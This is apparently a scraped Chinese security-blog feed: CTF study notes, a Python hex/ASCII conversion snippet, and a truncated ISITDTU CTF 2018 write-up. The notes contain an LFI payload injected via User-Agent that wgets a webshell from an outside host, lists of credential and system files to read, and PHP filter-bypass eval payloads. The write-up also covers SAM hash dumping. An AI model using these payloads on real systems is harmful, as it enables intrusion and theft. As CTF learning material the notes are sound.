    <content type="html"><![CDATA[<p>向老王学习，从我做起</p><a id="more"></a><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><h3 id="启动蚁剑"><a href="#启动蚁剑" class="headerlink" title="启动蚁剑"></a>启动蚁剑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm start</span><br></pre></td></tr></table></figure><h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="proc/self/environ"></a>proc/self/environ</h3><h3 id="LFI通过proc-self-environ直接获取webshell"><a href="#LFI通过proc-self-environ直接获取webshell" class="headerlink" title="LFI通过proc/self/environ直接获取webshell"></a><a href="https://blog.csdn.net/god_7z1/article/details/7904789" target="_blank" rel="noopener">LFI通过proc/self/environ直接获取webshell</a></h3><p>选择User-Agent 写代码如下：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?system(&apos;wget http://hack-bay.com/Shells/gny.txt -O shell.php&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>然后提交请求。        </p><p>我们的命令将被执行(将下载<a href="http://hack-bay.com/Shells/gny.txt" target="_blank" rel="noopener">http://hack-bay.com/Shells/gny.txt</a>，并将其保存为它在shell.php网站目录) </p><p><a href="http://www.am0s.com/penetration/131.html" target="_blank" rel="noopener">如何优雅的把lfi转化为rce（2017-02-27更新版）</a></p><h3 id="phpinfo知识点"><a href="#phpinfo知识点" class="headerlink" title="phpinfo知识点"></a>phpinfo知识点</h3><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p><h4 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h4><ol><li>/var/lib/php5/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><h3 id="透過-LFI-引入-PHP-session-檔案觸發-RCE"><a href="#透過-LFI-引入-PHP-session-檔案觸發-RCE" class="headerlink" title="透過 LFI 引入 PHP session 檔案觸發 RCE"></a><a href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></h3><p>當遇到 LFI 漏洞時，可以先檢查一下幾種可能的檔案：</p><ol><li>/etc/passwd</li><li>/proc/self/environ</li><li>All possible config files ( e.g. Apache /etc/httpd/conf/httpd.conf )</li><li>Web server access, error log ( e.g. /etc/httpd/logs/access_log )</li><li>Session files ( e.g. /tmp/sess_{SESSION_ID} )</li></ol><p>PHP 使用 <code>$_GET[1]、$_POST[1]</code>可以避開引號跳脫的問題(前面提到事後得知$_GET[b]即可正常執行)。</p><h3 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank" rel="noopener">php文件包含漏洞</a></h3><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><h3 id="php-不用字母，数字和下划线写-shell"><a href="#php-不用字母，数字和下划线写-shell" class="headerlink" title="php 不用字母，数字和下划线写 shell"></a><a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w" target="_blank" rel="noopener">php 不用字母，数字和下划线写 shell</a></h3><h3 id="CTF题目思考–极限利用"><a href="#CTF题目思考–极限利用" class="headerlink" title="CTF题目思考–极限利用"></a><a href="https://www.anquanke.com/post/id/154284" target="_blank" rel="noopener">CTF题目思考–极限利用</a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在Linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代</span><br><span class="line">$_=`/???/???%<span class="number">20</span>/????`;<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="string">"/bin/cat flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$&#123;<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>&#125;[<span class="string">'+'</span>]();&amp;+=getFlag</span><br><span class="line">$_GET[<span class="string">'+'</span>]);&amp;+=getFlag</span><br></pre></td></tr></table></figure><h3 id="CTF题思考之这题真的做不了吗？"><a href="#CTF题思考之这题真的做不了吗？" class="headerlink" title="CTF题思考之这题真的做不了吗？"></a><a href="https://www.anquanke.com/post/id/154144#h2-0" target="_blank" rel="noopener">CTF题思考之这题真的做不了吗？</a></h3><p>思维很重要 </p><p>我们发现SSRF之后，第一件事我认为做的绝非仅仅试试http协议</p><p>在探测的时候，我们一定会去尝试file协议读文件 </p><h3 id="信安之路历史文章检索"><a href="#信安之路历史文章检索" class="headerlink" title="信安之路历史文章检索"></a><a href="https://mp.weixin.qq.com/s/VH3JVNvRLHQnbQ2spppYnQ" target="_blank" rel="noopener">信安之路历史文章检索</a></h3><h3 id="以色列8200网络战队"><a href="#以色列8200网络战队" class="headerlink" title="以色列8200网络战队"></a>以色列8200网络战队</h3><p><a href="https://www.forbes.com/sites/richardbehar/2016/05/11/inside-israels-secret-startup-machine/#10f718ef1a51" target="_blank" rel="noopener">https://www.forbes.com/sites/richardbehar/2016/05/11/inside-israels-secret-startup-machine/#10f718ef1a51</a></p><h3 id="2018RealWorld-Web"><a href="#2018RealWorld-Web" class="headerlink" title="2018RealWorld-Web"></a><a href="https://www.anquanke.com/post/id/153259#h2-1" target="_blank" rel="noopener">2018RealWorld-Web</a></h3><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><h3 id="2018-BlackHat-Tools-List"><a href="#2018-BlackHat-Tools-List" class="headerlink" title="2018 BlackHat Tools List"></a><a href="https://github.com/1522402210/2018-BlackHat-Tools-List" target="_blank" rel="noopener">2018 BlackHat Tools List</a></h3><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p>根据提示频率，统计一下字符出现频率 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'file.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">print</span> collections.Counter(f.read())</span><br></pre></td></tr></table></figure><h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><p>Pwnable.kr ( <a href="https://link.zhihu.com/?target=http%3A//pwnable.kr" target="_blank" rel="noopener">http://pwnable.kr</a> )：有不同难度的题目，内容涵盖多个领域，界面很可爱</p><p><a href="https://link.zhihu.com/?target=http%3A//Pwnable.tw" target="_blank" rel="noopener">http://Pwnable.tw</a>（ <a href="https://link.zhihu.com/?target=http%3A//pwnable.tw" target="_blank" rel="noopener">Pwnable.tw </a>)：由台湾CTF爱好者组织的练习平台，质量较高</p><p>Exploit Exercises ( <a href="https://link.zhihu.com/?target=https%3A//exploit-exercises.com" target="_blank" rel="noopener">https://exploit-exercises.com</a> )：有比较完善的题目难度分级，还有虚拟机镜像供下载</p><h4 id="自动化打pwn"><a href="#自动化打pwn" class="headerlink" title="自动化打pwn?"></a>自动化打pwn?</h4><p><a href="https://asciinema.org/a/188002?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://asciinema.org/a/188002?tdsourcetag=s_pctim_aiomsg</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;向老王学习，从我做起&lt;/p&gt;
    
    </summary>
    
      <category term="Diary" scheme="http://blog.Lhaihai.wang/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>python3的二进制十六进制ASCII转换</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/python%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6ASCII%E8%BD%AC%E6%8D%A2/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/python的二进制十六进制ASCII转换/</id>
    <published>2018-08-09T16:51:19.000Z</published>
    <updated>2018-08-09T16:52:59.756Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/8/10</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 二进制十六进制ASCII</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#十六进制转二进制</span></span><br><span class="line">hex_ = bin(<span class="number">0x666c6167</span>)</span><br><span class="line"><span class="comment">#二进制转十六进制</span></span><br><span class="line">bi = hex(int(<span class="string">'1100110011011000110000101100111'</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(hex_)</span><br><span class="line">print(bi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ASCII转十六进制</span></span><br><span class="line">a = binascii.b2a_hex(<span class="string">b'flag'</span>)</span><br><span class="line"><span class="comment">#十六进制转ASCII</span></span><br><span class="line">b = binascii.a2b_hex(a)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0b1100110011011000110000101100111</span><br><span class="line">0x666c6167</span><br><span class="line">b&apos;666c6167&apos;</span><br><span class="line">b&apos;flag&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/python3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Time    : 2018/8/10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Author  : Lhaihai&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @File    : 二进制十六进制ASCII&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Software: PyCharm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Blog    : http://blog.Lhaihai.wang&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    Description : &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#十六进制转二进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hex_ = bin(&lt;span class=&quot;number&quot;&gt;0x666c6167&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#二进制转十六进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bi = hex(int(&lt;span class=&quot;string&quot;&gt;&#39;1100110011011000110000101100111&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(hex_)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(bi)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ASCII转十六进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a = binascii.b2a_hex(&lt;span class=&quot;string&quot;&gt;b&#39;flag&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#十六进制转ASCII&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;b = binascii.a2b_hex(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(b)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://blog.Lhaihai.wang/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTUCTF2018</title>
    <link href="http://blog.Lhaihai.wang/2018/07/28/ISITDTUCTF2018/"/>
    <id>http://blog.Lhaihai.wang/2018/07/28/ISITDTUCTF2018/</id>
    <published>2018-07-28T07:04:55.000Z</published>
    <updated>2018-08-25T07:09:30.953Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Play-with-…"><a href="#Play-with-…" class="headerlink" title="Play with …"></a>Play with …</h2><p>File: <a href="https://bit.ly/2v5FpzW" target="_blank" rel="noopener">https://bit.ly/2v5FpzW</a> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532950868539.png" alt="1532950868539"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532950892233.png" alt="1532950892233"></p><p>得到一张图片，修改图片大小，然后使用2345看图王反转图片，</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532950956134.png" alt="1532950956134"></p><p>反转后，大写字母和数字，有可能是base32，使用<a href="http://www.free-online-ocr.com/去ocr一下" target="_blank" rel="noopener">http://www.free-online-ocr.com/去ocr一下</a></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532950977713.png" alt="1532950977713"></p><p>得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KVXHA3DFMFZWC3TUEBXG64RAMRUW22LOOV2GS33OEBSXQY3FNRWGK3TDMUQGC4DBOJ2G2ZLOORZSA2LNOBZ</span><br><span class="line">HKZDFNZRWKIDUNBSSA3LFOQQG4ZLXFYQEI4TBO4QHAYLSOQQHI2DFNUQGQZJAMFXCA5DPEBUGKIDSN5XWMIDPN</span><br><span class="line">ZWHSLRAJV2XG2LDEBWGKYLWMUQHGYLZEBSG633SOMQGQ2LNFYQFI33SMUQGE4TFMQQGM33SNUQGSZRAONU</span><br><span class="line">WO2BAMNQXGZJAMFZSAZDPFYQFG5DBPFUW4ZZANBSSA3TPEBWG633LNFXGOIDJMYQGI3ZAN5YGS3TJN5XC4ICTM</span><br><span class="line">VXHI2LNMVXHI4ZAO5QXSIDVNZSGK4TTORXW6ZBAMVXGIIDQMFZHI2LBNRUXI6JAMFXGIIDINFZS4IAKBJKHK4TOMV</span><br><span class="line">SCA2LUEB2XAIDTNBXXK3DEEBXG6IDWMFWGYZLZEBRW65LTNFXCA2DFFYQFG4DFMFVWS3THEBXHK3LFOJXXK4ZAM</span><br><span class="line">FZWWIDENFSCA2DPOJZGSYTMMUQHAYLDNNQWOZLTEBZWK5BOEBAXG2DBNVSWIID,MVZHGZLMMYQGQYLTEBSGS</span><br><span class="line">43UMFXHI , DDMFXCA43UOVSGSZLEEBWXE4ZOEBGG KZBAORUG K4TFMZXXEZJANF2HGI DNNFSGI 3DFORXW4I DQMVZ</span><br><span class="line">HAZLUOVQWYI DGOVWGM2LMNRSWI I DQOJXXM2LTNFXW4 , DGOJQW42 3OMVZXGLRAIZWGCZZANFZSASKTJF KEIVCV</span><br><span class="line">PM2G4XZUNZTTG3C7GBTF6MLNGRTTGX3 IGNZDGIL5FYQFG3LBNRWCA 2DFEBSHEYLXNYQGCZTUMVZCAYLNN5XGOI D</span><br><span class="line">FOZSXE6JAORUHEZLFEBXG6LRAIFWGYI DI MF3GS3THEBRH K5BAPFXXKI DFMR3WC4TEEBTW K3TJOVZSA5DIN5 2WO2BA</span><br><span class="line">OJSW2YLSNMQG63TFFYQAUCSJNZZWS4DJMRUXI 6JAORUG KI DTOVTGM2LDNFSW45BAMRUXGY3SMV2GS33OEBUW</span><br><span class="line">24DSOVSG K3TDMUQHEZLTN5WH K5DJN5XCA43JOIQGQ2LNEBSG KY3JONUXMZLMPEXCAUDSN5RWKZLEEBUG65ZAM</span><br><span class="line">FXHSI DFNZTW CZ3FMQQHM2LTNF2G64ROEBCXQ4DMMFUW4ZLEEBYHE33QOJUWK5DZEBXWMZRAN5 2XI I DQMVZH</span><br><span class="line">AZLUOVQWYI DINFZSA6LPOUXCARTFMVWCA43 PNRSCA33GMYQGMZLMOQQG4YLZEBZG643FEBWWK5BAPFXXKLRAK</span><br><span class="line">5SSA43 PEBSW45DSMVQX, 2LFOMQGG5LMORUXMYLUMVSCAYLTORXW42LTNBSW , , DJOMXCAV3BOMQHG2LTORSXE</span><br><span class="line">, DGN5ZCAZTFO4QGY3 3OM5SXE , DNOJZSA43VMRSG K3RAORQWYZLOOQQGEZLDN5WWKLRA , RXW4ZJANVQXSI DCN5</span><br><span class="line">ZG K , DROVUX , , DFOZUWY , DPNRSCA 3UNRSS4 ,GMYQGY2LLMVWHS , DBNUQG6ZRAMJSWC5LUPEQH ,YLTORSXGLRA</span><br></pre></td></tr></table></figure><p>ocr出来的在<a href="https://geocaching.dennistreysa.de/multisolver/解密" target="_blank" rel="noopener">https://geocaching.dennistreysa.de/multisolver/解密</a></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532950723526.png" alt="1532950723526"></p><blockquote><p>{4n_4ng3l_0f_1m4g3_h3r3!}</p></blockquote><p><a href="https://theflagisnothere.github.io/categories/ISITDTU%20CTF%202018%20/Play%20with/" target="_blank" rel="noopener">https://theflagisnothere.github.io/categories/ISITDTU%20CTF%202018%20/Play%20with/</a></p><h2 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What is this?"></a>What is this?</h2><blockquote><p>My friend send me this file but I don’t know what it is?</p><p>Note: Flag is not in format, please submit what you found.</p><p><a href="https://bit.ly/2JNvYdF" target="_blank" rel="noopener">https://bit.ly/2JNvYdF</a></p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532947906475.png" alt="1532947906475"></p><p>师傅们一下子就猜测出是windows 的SAM文和system文件，保存了windows的用户名和密码</p><p>使用samdump2</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532947882892.png" alt="1532947882892"></p><p>在<a href="https://crackstation.net/破解hash" target="_blank" rel="noopener">https://crackstation.net/破解hash</a></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532947981818.png" alt="1532947981818"></p><blockquote><p>flag is r4inb0w </p></blockquote><p><a href="https://theflagisnothere.github.io/categories/ISITDTU%20CTF%202018%20/What%20is%20this/" target="_blank" rel="noopener">https://theflagisnothere.github.io/categories/ISITDTU%20CTF%202018%20/What%20is%20this/</a></p><p><a href="https://blog.csdn.net/boy_from_village/article/details/80383419" target="_blank" rel="noopener">https://blog.csdn.net/boy_from_village/article/details/80383419</a></p><p><a href="https://www.cnblogs.com/tzuxung/p/5861839.html" target="_blank" rel="noopener">https://www.cnblogs.com/tzuxung/p/5861839.html</a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="IZ"><a href="#IZ" class="headerlink" title="IZ"></a>IZ</h2><blockquote><p>It’s just PHP !!!<a href="http://35.185.178.212/" target="_blank" rel="noopener">http://35.185.178.212/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>; </span><br><span class="line">$number1 = rand(<span class="number">1</span>,<span class="number">100000000000000</span>); </span><br><span class="line">$number2 = rand(<span class="number">1</span>,<span class="number">100000000000</span>); </span><br><span class="line">$number3 = rand(<span class="number">1</span>,<span class="number">100000000</span>); </span><br><span class="line">$url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]); </span><br><span class="line">$url = parse_url($url, PHP_URL_QUERY); </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/_/i"</span>, $url))  </span><br><span class="line">&#123; </span><br><span class="line">    <span 